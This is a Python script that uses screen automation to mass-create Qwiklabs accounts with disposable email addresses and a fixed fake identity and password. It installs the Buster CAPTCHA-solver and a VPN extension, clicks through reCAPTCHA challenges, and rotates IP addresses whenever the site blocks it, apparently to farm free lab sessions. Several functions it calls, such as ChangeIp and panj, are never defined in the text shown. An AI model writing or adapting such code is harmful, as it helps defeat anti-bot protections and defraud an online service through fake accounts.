#!/usr/bin/python
# -*- coding: utf-8 -*-
# import os
# os.system('cmd /c "cd Desktop && cd chrome signup && qwiklabs.com - Chrome.lnk"')

import pyautogui
from time import sleep
import webbrowser
from pynput.mouse import Button, Controller
mouse = Controller()
from pynput.keyboard import Key, Controller
keyboard = Controller()
import pyperclip
import pyautogui
from time import sleep
import random
import string
sleep(5)

def recaptcha_Ip_Blocker():
    if pyautogui.locateOnScreen('recaptchaIpBlock.png') != None:
                    i = 1
                    panj()
                    while True:
                        
                        ChangeIp()
                        if i == 1:
                            signup()
                            sleep(3)
                            signin()
                            i = i + 1
                        signin2()
                        sleep(3)
                        if i % 5 == 0:
                            panj()
                            i = 0
                        i = i + 1
def Controll_Error():
    if pyautogui.locateOnScreen('qwiklabsError.png', confidence=0.6) != None:
        sleep(3)
        if pyautogui.locateOnScreen('qwiklabsError.png', confidence=0.6) != None:
            sleep(3)
            if pyautogui.locateOnScreen('qwiklabsError.png', confidence=0.6) != None:
                    i = 1
                    panj()
                    while True:
                        
                        ChangeIp()
                        if i == 1:
                            signup()
                            sleep(3)
                            signin()
                            i = i + 1
                        signin2()
                        sleep(3)
                        if i % 5 == 0:
                            panj()
                            i = 0
                        i = i + 1

def retry1():
    if pyautogui.locateOnScreen('emailrecaptchaclick2.png') != None:
            try:

                if pyautogui.locateOnScreen('emailrecaptchaclick2.png') \
                    != None:
                    pyautogui.click('emailrecaptchaclick2.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    pass
            except:
                sleep(6)
                if pyautogui.locateOnScreen('emailrecaptchaclick2.png') \
                    != None:
                    pyautogui.click('emailrecaptchaclick2.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    pass

                                    # #click on solver

            try:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    pass
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('1')
                    keyboard.release('1')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                recaptcha_Ip_Blocker()
            except:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('1')
                    keyboard.release('1')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                    recaptcha_Ip_Blocker()
            sleep(8)
            if pyautogui.locateOnScreen('captchaPASS.png',
                    confidence=0.8) != None:
                pass



                                    # #click on refresh

            try:

                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    pass
                recaptcha_Ip_Blocker()
            except:
                sleep(2)
                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                recaptcha_Ip_Blocker()
            sleep(3)
            if pyautogui.locateOnScreen('captchaPASS.png',
                    confidence=0.8) != None:
                pass
def retry2():
    if pyautogui.locateOnScreen('recaptchaqwiklabs2.png') != None:
            try:

                if pyautogui.locateOnScreen('recaptchaqwiklabs2.png') \
                    != None:
                    pyautogui.click('recaptchaqwiklabs2.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    pass
            except:
                sleep(6)
                if pyautogui.locateOnScreen('recaptchaqwiklabs2.png') \
                    != None:
                    pyautogui.click('recaptchaqwiklabs2.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    pass

                                    # #click on solver

            try:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    pass
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('1')
                    keyboard.release('1')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                recaptcha_Ip_Blocker()
            except:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('1')
                    keyboard.release('1')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                recaptcha_Ip_Blocker()
            sleep(8)
            if pyautogui.locateOnScreen('captchaPASS.png',
                    confidence=0.8) != None:
                pass



                                    # #click on refresh

            try:

                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    pass
            except:
                sleep(2)
                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
            sleep(3)
            if pyautogui.locateOnScreen('captchaPASS.png',
                    confidence=0.8) != None:
                pass

def Buster_Money():
    pyautogui.keyDown('ctrl')
    pyautogui.press('w')
    pyautogui.keyUp('ctrl')
    sleep(1)
def install_chrome():

    # #sleep

    sleep(25)

    # #maximize

    mouse.position = (549, 100)
    mouse.click(Button.left, 1)
    sleep(1)
    pyautogui.keyDown('alt')
    pyautogui.keyDown('space')
    pyautogui.press('x')
    pyautogui.keyUp('alt')
    pyautogui.keyUp('space')
    mouse.position = (1085, 242)
    mouse.click(Button.left, 1)

    # #select search bar

    keyboard.press(Key.ctrl)
    keyboard.press('l')
    keyboard.release('l')
    keyboard.release(Key.ctrl)
    sleep(0.5)


def download_extention():

    # #go to site buster varifier

    keyboard.type('https://chrome.google.com/webstore/detail/buster-captcha-solver-for/mpbjkejclgfgadiemmefgebjfooflfhl?hl=en'
                  )
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    sleep(7)

    # #add to chrome

    mouse.position = (1085, 242)
    mouse.click(Button.left, 1)
    sleep(1)
    mouse.position = (722, 273)
    mouse.click(Button.left, 1)
    mouse.click(Button.left, 1)
    sleep(5)

    # #New page

    keyboard.press(Key.ctrl)
    keyboard.press('t')
    keyboard.release('t')
    keyboard.release(Key.ctrl)
    sleep(0.5)

    # #go to first page and close it

    keyboard.press(Key.ctrl)
    keyboard.press('1')
    keyboard.release('1')
    keyboard.release(Key.ctrl)
    sleep(0.5)
    keyboard.press(Key.ctrl)
    keyboard.press('w')
    keyboard.release('w')
    keyboard.release(Key.ctrl)
    sleep(0.75)

    # #select search bar

    keyboard.press(Key.ctrl)
    keyboard.press('l')
    keyboard.release('l')
    keyboard.release(Key.ctrl)
    sleep(0.5)

    # #go to site buster varifier

    keyboard.type('https://chrome.google.com/webstore/detail/browsec-vpn-free-vpn-for/omghfjlpggmjjaagoclmmobgdodcjboh?hl=en'
                  )
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    sleep(7)

    # #add to chrome

    mouse.position = (1098, 241)
    mouse.click(Button.left, 1)
    sleep(1)
    mouse.position = (714, 214)
    mouse.click(Button.left, 1)
    mouse.click(Button.left, 1)
    sleep(5)

    # #New page

    keyboard.press(Key.ctrl)
    keyboard.press('t')
    keyboard.release('t')
    keyboard.release(Key.ctrl)
    sleep(0.5)

    # #go to first page and close it

    keyboard.press(Key.ctrl)
    keyboard.press('1')
    keyboard.release('1')
    keyboard.release(Key.ctrl)
    sleep(0.5)
    keyboard.press(Key.ctrl)
    keyboard.press('w')
    keyboard.release('w')
    keyboard.release(Key.ctrl)
    sleep(0.75)

    # #select search bar

    keyboard.press(Key.ctrl)
    keyboard.press('l')
    keyboard.release('l')
    keyboard.release(Key.ctrl)
    sleep(1)


def signup():

        # # select search bar

    x = 471
    y = 56
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)
    ##select search bar

    keyboard.press(Key.ctrl)
    keyboard.press('l')
    keyboard.release('l')
    keyboard.release(Key.ctrl)
    sleep(1)
        # # go to site

    pyautogui.typewrite('https://www.qwiklabs.com/users/sign_up',
                        interval=0.02)
    pyautogui.press('enter')

        # sleep(3)
        # # click creat account
        # x = 1192
        # y = 105
        # pyautogui.moveTo( x , y , duration = 0.1)
        # pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
        # open email generator
        # #new tab
        # x = 272
        # y = 12
        # pyautogui.moveTo( x , y , duration = 0.1)
        # sleep(0.5)
        # pyautogui.click(button = "left", clicks = 1 , interval = 0.1)

    pyautogui.keyDown('ctrl')
    pyautogui.press('t')
    pyautogui.keyUp('ctrl')

        # select search bar

    x = 160
    y = 50
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)

        # go to site

    pyautogui.typewrite('https://generator.email/', interval=0.02)
    pyautogui.press('enter')
    sleep(6)

        # #generate new email

    x = 608
    y = 564
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)
    x = 608
    y = 631
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)
    x = 613
    y = 595
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)
    x = 985
    y = 543
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=2, interval=0.1)
    sleep(2)

        # copy emaile

    x = 985
    y = 543
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=2, interval=0.1)
    sleep(0.2)
    c = pyperclip.paste()

        # back to previos tab

    x = 62
    y = 17
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)

        # fill form
        # # name and lastname
        # x = 558
        # y = 393
        # pyautogui.moveTo( x , y , duration = 0.1)
        # sleep(0.5)
        # pyautogui.click(button = "left", clicks = 1 , interval = 0.1)

    pyautogui.press('tab')
    pyautogui.typewrite('alex', interval=0.02)

        # x = 796
        # y = 399
        # pyautogui.moveTo( x , y , duration = 0.1)
        # sleep(0.5)
        # pyautogui.click(button = "left", clicks = 1 , interval = 0.1)

    pyautogui.press('tab')
    pyautogui.typewrite('boboltala', interval=0.02)

        # # paste email
        # x = 647
        # y = 473
        # pyautogui.moveTo( x , y , duration = 0.1)
        # sleep(0.5)
        # pyautogui.click(button = "left", clicks = 1 , interval = 0.1)

    pyautogui.press('tab')
    keyboard.type(c)

        # # select company
        # x = 695
        # y = 524
        # pyautogui.moveTo( x , y , duration = 0.1)
        # sleep(0.5)
        # pyautogui.click(button = "left", clicks = 1 , interval = 0.1)

    pyautogui.press('tab')
    pyautogui.typewrite('boboltala', interval=0.02)

        # #write pass
        # x = 538
        # y = 592
        # pyautogui.moveTo( x , y , duration = 0.1)
        # sleep(0.5)
        # pyautogui.click(button = "left", clicks = 1 , interval = 0.1)

    pyautogui.press('tab')
    pyautogui.typewrite('boboltala1$$', interval=0.02)

        # x = 777
        # y = 600
        # pyautogui.moveTo( x , y , duration = 0.1)
        # sleep(0.5)
        # pyautogui.click(button = "left", clicks = 1 , interval = 0.1)

    pyautogui.press('tab')
    pyautogui.typewrite('boboltala1$$', interval=0.02)

        # scroll down

    x = 1360
    y = 720
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=10, interval=0.1)

    # #click in recaptcha

    while True:
        if True:
            try:

                if pyautogui.locateOnScreen('emailrecaptchaclick.png') \
                    != None:
                    pyautogui.click('emailrecaptchaclick.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
            except:
                sleep(6)
                if pyautogui.locateOnScreen('emailrecaptchaclick.png') \
                    != None:
                    pyautogui.click('emailrecaptchaclick.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break

                                    # #click on solver

            try:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('1')
                    keyboard.release('1')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                retry1()
                recaptcha_Ip_Blocker()
            except:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('1')
                    keyboard.release('1')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                retry1()
                recaptcha_Ip_Blocker()
            sleep(8)
            if pyautogui.locateOnScreen('captchaPASS.png',
                    confidence=0.8) != None:
                break



                                    # #click on refresh

            try:

                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                
            except:
                sleep(2)
                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                
            sleep(3)
            if pyautogui.locateOnScreen('captchaPASS.png',
                    confidence=0.8) != None:
                break
            else:
                retry1()
            try:

                if pyautogui.locateOnScreen('emailrecaptchaclick.png') \
                    != None:
                    pyautogui.click('emailrecaptchaclick.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry1()
            except:
                sleep(6)
                if pyautogui.locateOnScreen('emailrecaptchaclick.png') \
                    != None:
                    pyautogui.click('emailrecaptchaclick.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry1()

                                    # #click on solver

            try:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                
                else:
                    retry1()
                recaptcha_Ip_Blocker()
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('1')
                    keyboard.release('1')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
            except:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('1')
                    keyboard.release('1')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                recaptcha_Ip_Blocker()
            sleep(8)
            if pyautogui.locateOnScreen('captchaPASS.png',
                    confidence=0.8) != None:
                break
            else:
                retry1()

                                    # #click on refresh

            try:

                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry1()
            except:
                sleep(2)
                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                
            sleep(3)
            if pyautogui.locateOnScreen('captchaPASS.png',
                    confidence=0.8) != None:
                break
            else:
                retry1()

                                    # #click in recaptcha

            try:

                if pyautogui.locateOnScreen('emailrecaptchaclick.png') \
                    != None:
                    pyautogui.click('emailrecaptchaclick.png')
                    try:
                        sleep(2)
                        if pyautogui.locateOnScreen('buster.png') \
                            != None:
                            pyautogui.click('buster.png')
                            sleep(1)
                        
                        if pyautogui.locateOnScreen('captchaPASS.png',
                                confidence=0.8) != None:
                            break
                        if pyautogui.locateOnScreen('busterMoney.png') != None:
                            Buster_Money()
                            keyboard.press(Key.ctrl)
                            keyboard.press('1')
                            keyboard.release('1')
                            keyboard.release(Key.ctrl)
                            sleep(0.5)
                        recaptcha_Ip_Blocker()
                    except:
                        sleep(2)
                        if pyautogui.locateOnScreen('buster.png') \
                            != None:
                            pyautogui.click('buster.png')
                            sleep(1)
                        if pyautogui.locateOnScreen('busterMoney.png') \
                            != None:
                            Buster_Money()
                            keyboard.press(Key.ctrl)
                            keyboard.press('1')
                            keyboard.release('1')
                            keyboard.release(Key.ctrl)
                            sleep(0.5)
                        recaptcha_Ip_Blocker()
                        
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry1()
            except:
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry1()
                                    # #click on solver

            try:

                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('1')
                    keyboard.release('1')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                recaptcha_Ip_Blocker()
                
            except:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('1')
                    keyboard.release('1')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                recaptcha_Ip_Blocker()
                
            sleep(8)
            if pyautogui.locateOnScreen('captchaPASS.png',
                    confidence=0.8) != None:
                break
            else:
                retry1()
                                    # #click on refresh

            try:

                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry1()

            except:
                sleep(2)
                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                
            sleep(3)
            if pyautogui.locateOnScreen('captchaPASS.png',
                    confidence=0.8) != None:
                break
            try:

                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(8)
                if pyautogui.locateOnScreen('captchaPASS.png',
                        confidence=0.8) != None:
                    break
                retry1()
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('1')
                    keyboard.release('1')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                recaptcha_Ip_Blocker()
            except:
                if pyautogui.locateOnScreen('captchaPASS.png') == None:
                    i = 1
                    panj()
                    while True:
                        
                        ChangeIp()
                        if i == 1:
                            signup()
                            sleep(3)
                            signin()
                            i = i + 1
                        signin2()
                        sleep(3)
                        if i % 5 == 0:
                            panj()
                            i = 0
                        i = i + 1

        # click on creat account

    x = 865
    y = 567
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)
    pyautogui.press('enter')

        # email tab

    x = 272
    y = 12
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)

        # # go to gmail

    x = 335
    y = 18
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)
    sleep(5)

        # # click on refresh

    pyautogui.keyDown('ctrl')
    pyautogui.press('r')
    pyautogui.keyUp('ctrl')
    sleep(4)
    x = 745
    y = 557
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)
    x = 774
    y = 630
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)
    sleep(3)

        # # scroll down 12 times

    x = 1357
    y = 720
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=12, interval=0.03)

        # # close advertise

    x = 837
    y = 262
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.1)

        # x = 621
        # y = 431
        # pyautogui.moveTo( x , y , duration = 0.1)
        # sleep(0.5)
        # pyautogui.click(button = "left", clicks = 1 , interval = 0.1)

    sleep(3)

        # # scroll down 42 times

    x = 1357
    y = 720
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=42, interval=0.03)

        # # select confirmation

    x = 501
    y = 220
    pyautogui.moveTo(x, y, duration=0.1)
    sleep(0.5)
    pyautogui.click(button='left', clicks=1, interval=0.03)
    sleep(9)

        # select pass

    mouse.position = (696, 391)
    mouse.click(Button.left, 1)
    mouse.click(Button.left, 1)
    pyautogui.typewrite('boboltala1$$', interval=0.02)

        # sign in

    mouse.position = (832, 538)
    mouse.click(Button.left, 1)
    sleep(4)

        # #close tab1 and tab2

    pyautogui.keyDown('ctrl')
    pyautogui.press('1')
    pyautogui.keyUp('ctrl')
    sleep(0.2)
    pyautogui.keyDown('ctrl')
    pyautogui.press('w')
    pyautogui.keyUp('ctrl')
    sleep(0.2)
    pyautogui.keyDown('ctrl')
    pyautogui.press('w')
    pyautogui.keyUp('ctrl')

        # #back

    mouse.position = (23, 47)
    mouse.click(Button.left, 1)
    sleep(3)
    pyautogui.keyDown('ctrl')
    pyautogui.press('r')
    pyautogui.keyUp('ctrl')
    sleep(2)


def signin():

#####################################click on search bar

    if pyautogui.locateOnScreen('qwiklabsSearchbar.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('qwiklabsSearchbar.png') != None:
        pass
    if pyautogui.locateOnScreen('qwiklabsSearchbar.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('qwiklabsSearchbar.png') != None:
        pass
    if pyautogui.locateOnScreen('qwiklabsSearchbar.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('qwiklabsSearchbar.png') != None:
        pass
    if pyautogui.locateOnScreen('qwiklabsSearchbar.png') == None:
        pyautogui.keyDown('ctrl')
        pyautogui.press('r')
        pyautogui.keyUp('ctrl')
        sleep(2)
    if pyautogui.locateOnScreen('qwiklabsSearchbar.png') != None:
        pass
    if pyautogui.locateOnScreen('qwiklabsSearchbar.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('qwiklabsSearchbar.png') != None:
        pass
    if pyautogui.locateOnScreen('qwiklabsSearchbar.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('qwiklabsSearchbar.png') != None:
        pass
    if pyautogui.locateOnScreen('qwiklabsSearchbar.png') == None:
        i = 1
        panj2()
        while True:
            
            ChangeIp()
            if i == 1:
                signup()
                sleep(3)
                signin()
                i = i + 1
            signin2()
            sleep(3)
            if i % 5 == 0:
                panj()
                i = 0
            i = i + 1
    sleep(0.5)
    if pyautogui.locateOnScreen('qwiklabsSearchbar.png') != None:
         pyautogui.click('qwiklabsSearchbar.png')
    sleep(1)
    keyboard.type('A Tour of Qwiklabs and Google Cloud')
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    sleep(2)

        # #click on cloud google
    if pyautogui.locateOnScreen('A Tour of Qwiklabs and Google Cloud.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('A Tour of Qwiklabs and Google Cloud.png') != None:
        pass
    if pyautogui.locateOnScreen('A Tour of Qwiklabs and Google Cloud.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('A Tour of Qwiklabs and Google Cloud.png') != None:
        pass
    if pyautogui.locateOnScreen('A Tour of Qwiklabs and Google Cloud.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('A Tour of Qwiklabs and Google Cloud.png') != None:
        pass
    if pyautogui.locateOnScreen('A Tour of Qwiklabs and Google Cloud.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('A Tour of Qwiklabs and Google Cloud.png') != None:
        pass
    if pyautogui.locateOnScreen('A Tour of Qwiklabs and Google Cloud.png') == None:
        sleep(2)
    if pyautogui.locateOnScreen('A Tour of Qwiklabs and Google Cloud.png') != None:
        pass
    if pyautogui.locateOnScreen('A Tour of Qwiklabs and Google Cloud.png') == None:
        sleep(5)
    if pyautogui.locateOnScreen('A Tour of Qwiklabs and Google Cloud.png') != None:
        pass
    if pyautogui.locateOnScreen('A Tour of Qwiklabs and Google Cloud.png') == None:
        i = 1
        panj2()
        while True:
            
            ChangeIp()
            if i == 1:
                signup()
                sleep(3)
                signin()
                i = i + 1
            signin2()
            sleep(3)
            if i % 5 == 0:
                panj()
                i = 0
            i = i + 1
    if pyautogui.locateOnScreen('A Tour of Qwiklabs and Google Cloud.png') != None:
         pyautogui.click('A Tour of Qwiklabs and Google Cloud.png')
    sleep(10)
        # #skip video

    mouse.position = (899, 635)
    mouse.click(Button.left, 1)
    mouse.click(Button.left, 1)
    sleep(3)

        # #select start

    mouse.position = (55, 177)
    mouse.click(Button.left, 1)
    mouse.click(Button.left, 1)
    sleep(3)

        # #select recaptcha
        # #click in recaptcha

    while True:
        if True:
            try:

                if pyautogui.locateOnScreen('recaptchaqwiklabs.png') \
                    != None:
                    pyautogui.click('recaptchaqwiklabs.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                Controll_Error()
            except:
                sleep(6)
                if pyautogui.locateOnScreen('recaptchaqwiklabs.png') \
                    != None:
                    pyautogui.click('recaptchaqwiklabs.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                Controll_Error()

                            # #click on solver

            try:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                
                else:
                    retry2()
                recaptcha_Ip_Blocker()
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('2')
                    keyboard.release('2')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                Controll_Error()
            except:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('2')
                    keyboard.release('2')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                Controll_Error()
                recaptcha_Ip_Blocker()
                
            sleep(8)
            if pyautogui.locateOnScreen('EndLab.png',
                    confidence=0.8) != None:
                break
            else:
                retry2()

                            # #click on refresh

            try:

                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                Controll_Error()
            except:
                sleep(2)
                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                
            sleep(3)
            if pyautogui.locateOnScreen('EndLab.png',
                    confidence=0.8) != None:
                break
            else:
                retry2()
            Controll_Error()
            try:

                if pyautogui.locateOnScreen('recaptchaqwiklabs.png') \
                    != None:
                    pyautogui.click('recaptchaqwiklabs.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                Controll_Error()
            except:
                sleep(6)
                if pyautogui.locateOnScreen('recaptchaqwiklabs.png') \
                    != None:
                    pyautogui.click('recaptchaqwiklabs.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                Controll_Error()

                            # #click on solver

            try:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                
                else:
                    retry2()
                recaptcha_Ip_Blocker()
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('2')
                    keyboard.release('2')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                Controll_Error()
                recaptcha_Ip_Blocker()
            except:
                sleep(2)
                if pyautogui.locateOnScreen('buster.png') != None:
                    pyautogui.click('buster.png')
                    sleep(1)
                if pyautogui.locateOnScreen('busterMoney.png') \
                    != None:
                    Buster_Money()
                    keyboard.press(Key.ctrl)
                    keyboard.press('2')
                    keyboard.release('2')
                    keyboard.release(Key.ctrl)
                    sleep(0.5)
                Controll_Error()
                recaptcha_Ip_Blocker()
                
            sleep(8)
            if pyautogui.locateOnScreen('EndLab.png',
                    confidence=0.8) != None:
                break
            else:
                retry2()

                            # #click on refresh

            try:

                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
                if pyautogui.locateOnScreen('EndLab.png',
                        confidence=0.8) != None:
                    break
                else:
                    retry2()
                Controll_Error()
            except:
                sleep(2)
                if pyautogui.locateOnScreen('refresh.png') != None:
                    pyautogui.click('refresh.png')
                    sleep(1)
            sleep(3)
            if pyautogui.locateOnScreen('EndLab.png',
                    confidence=0.8) != None:
                break
            else:
                retry2()
